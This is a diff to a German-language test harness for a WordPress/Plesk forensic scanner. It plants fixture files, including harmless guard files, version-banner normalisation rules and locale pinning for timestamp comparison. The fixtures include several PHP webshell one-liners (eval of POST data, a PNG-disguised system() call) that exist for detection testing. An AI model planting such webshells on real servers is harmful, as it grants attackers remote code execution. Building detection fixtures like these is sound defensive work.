@@ -235,6 +235,29 @@ PHP
   # Webshell im Uploads-Verzeichnis — PHP gehoert dort nie hin.
   printf '<?php eval(base64_decode($_POST["c"])); ?>\n' \
     > "${k2}/wp-content/uploads/2026/03/bild.php"
+
+  # Waechter-Dateien: legitim, duerfen NICHT als Fund erscheinen.
+  #
+  # Ein Messlauf ueber 68 Installationen meldete 274 leere index.php als
+  # "extrem verdaechtig". Der Grund war eine Luecke in der Reihenfolge: der
+  # Waechter-Test verlangte eine kleine Datei UND einen Inhaltstreffer — eine
+  # leere Datei liefert keinen Treffer und rutschte durch. Ein Bericht, der
+  # 274 harmlose Dateien anklagt, wird im Ganzen nicht mehr gelesen.
+  #
+  # NT_PRUEFSTAND_OHNE_WAECHTER=1 legt an dieselben Stellen echte PHP-Dateien.
+  # Dann MUSS der Vergleich ausschlagen — sonst filtert der Waechter-Zweig
+  # nicht mehr nur Waechter, sondern deckt Funde zu.
+  mkdir -p "${k2}/wp-content/uploads/forminator" "${k2}/wp-content/uploads/cache"
+  if [[ "${NT_PRUEFSTAND_OHNE_WAECHTER:-0}" != "1" ]]; then
+    # Bewusst drei verschiedene Faelle, damit jeder Zweig einzeln getragen wird:
+    : > "${k2}/wp-content/uploads/index.php"                            # leer → Groessen-Zweig
+    printf '<?php exit;\n' > "${k2}/wp-content/uploads/forminator/index.php"  # → Pfadmuster
+    printf '<?php exit;\n' > "${k2}/wp-content/uploads/cache/index.php"       # → Pfadmuster
+  else
+    printf '<?php eval($_POST["a"]);\n' > "${k2}/wp-content/uploads/index.php"
+    printf '<?php eval($_POST["b"]);\n' > "${k2}/wp-content/uploads/forminator/index.php"
+    printf '<?php eval($_POST["c"]);\n' > "${k2}/wp-content/uploads/cache/index.php"
+  fi
   # Als Nicht-PHP getarnte Nutzlast.
   printf '\x89PNG\r\n\x1a\n<?php system($_GET["x"]); ?>\n' \
     > "${k2}/wp-content/uploads/2026/03/logo.png"
@@ -540,7 +563,12 @@ REGELN = [
     # wo sie als Fassung auftritt — ein blindes \d+\.\d+\.\d+ hat im ersten
     # Anlauf auch Nextcloud-Versionen in Dateinamen getroffen und damit einen
     # echten Unterschied verdeckt.
-    (r'(wp_plesk_forensik\.sh |NT-Forensik |Tool-Version: |\*\*Erstellt durch\*\* \| wp_plesk_forensik\.sh )v?\d+\.\d+\.\d+',
+    # WP-PLESK-FORENSIK: die Kopfzeile des Banners aus lib/konfig.sh. Sie fehlte
+    # in dieser Liste, obwohl sie in jedem Lauf als erstes erscheint. Folge: nach
+    # jedem Versionssprung schlug der Vergleich aus, wurde die Referenz neu
+    # aufgenommen — und die Neuaufnahme uebernahm stillschweigend jede echte
+    # Abweichung mit, die im selben Sprung entstanden war.
+    (r'(wp_plesk_forensik\.sh |WP-PLESK-FORENSIK |NT-Forensik |Tool-Version: |\*\*Erstellt durch\*\* \| wp_plesk_forensik\.sh )v?\d+\.\d+\.\d+',
                                                     r'\1<FASSUNG>'),
     (r'"tool_version": "\d+\.\d+\.\d+"',            '"tool_version": "<FASSUNG>"'),
 ]
@@ -574,6 +602,14 @@ PY
 # ── Lauf ─────────────────────────────────────────────────────
 lauf_ausfuehren() {
   local W="$1" ABLAGE="$2"
+  # Sprachumgebung festnageln. Die Normalisierungsregel fuer Zeitstempel
+  # erkennt die englische Form von `date` ("Tue Aug 11 12:42:36 CEST 2026").
+  # Auf einem deutsch eingestellten Rechner liefert `date` "Di 11. Aug
+  # 12:42:36 CEST 2026", die Regel greift nicht, und der Vergleich schlaegt
+  # bei JEDEM Lauf aus — er meldet dann nichts als die Uhrzeit und wird
+  # dadurch wertlos. LC_ALL statt LANG, damit es auch eine gesetzte
+  # LC_TIME ueberstimmt.
+  LC_ALL=C LANG=C \
   NT_TESTLAUF=1 \
   NT_BASE_DIR="$ABLAGE" \
   NT_VHOSTS_DIR="$W" \
